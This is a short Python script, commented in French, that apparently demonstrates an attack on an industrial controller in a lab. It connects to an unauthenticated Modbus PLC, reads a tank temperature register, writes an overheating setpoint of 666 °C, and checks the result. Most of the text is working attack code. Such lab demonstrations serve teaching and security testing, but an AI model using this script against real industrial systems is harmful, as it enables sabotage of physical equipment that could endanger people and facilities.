from pymodbus.client import ModbusTcpClient
import time

# 1. Connexion (Vulnérabilité : Pas de certificat SSL demandé)
print("--- CONNEXION ---")
client = ModbusTcpClient('lab_plc', port=502)
client.connect()

# 2. Lecture (Vulnérabilité : Lecture libre)
print("--- LECTURE ÉTAT INITIAL ---")
valeur_avant = client.read_holding_registers(0, 1)
print(f"Température actuelle de la cuve : {valeur_avant.registers[0]} °C")

# 3. Attaque (Vulnérabilité : No Auth - Pas de mot de passe)
print("--- INJECTION DE LA COMMANDE DE SURCHAUFFE ---")
client.write_register(0, 666)
print("Commande envoyée : Régler température à 666 °C")

# 4. Vérification
valeur_apres = client.read_holding_registers(0, 1)
print(f"Nouvelle température de la cuve : {valeur_apres.registers[0]} °C")